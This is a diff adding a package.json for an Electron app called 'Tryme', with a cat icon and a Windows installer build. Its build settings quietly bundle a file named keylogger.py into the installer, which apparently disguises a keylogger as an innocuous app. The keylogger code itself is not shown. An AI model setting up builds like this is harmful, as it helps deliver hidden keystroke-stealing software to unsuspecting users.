@@ -1,0 +1,42 @@
+{
+  "name": "Tryme",
+  "version": "1.0.0",
+  "description": "",
+  "main": "main.js",
+  "author": "",
+  "license": "ISC",
+  "scripts": {
+    "start": "electron .",
+    "build": "electron-builder",
+    "dist": "electron-builder"
+  },
+  "devDependencies": {
+    "electron": "^33.2.0",
+    "electron-builder": "^25.1.8",
+    "electron-packager": "^17.1.2"
+  },
+  "build": {
+    "appId": "com.Tryme",
+    "productName": "Tryme",
+    "win": {
+      "icon": "assets/cat.jpg",
+      "target": [
+        {
+          "target": "nsis",
+          "arch": [
+            "x64",
+            "ia32"
+          ]
+        }
+      ],
+      "artifactName": "${productName} Setup ${version}.${ext}"
+    },
+    "directories": {
+      "output": "dist"
+    },
+    "extraFiles": [
+      "keylogger.py",
+      "assets/**/*"
+    ]
+  }
+}
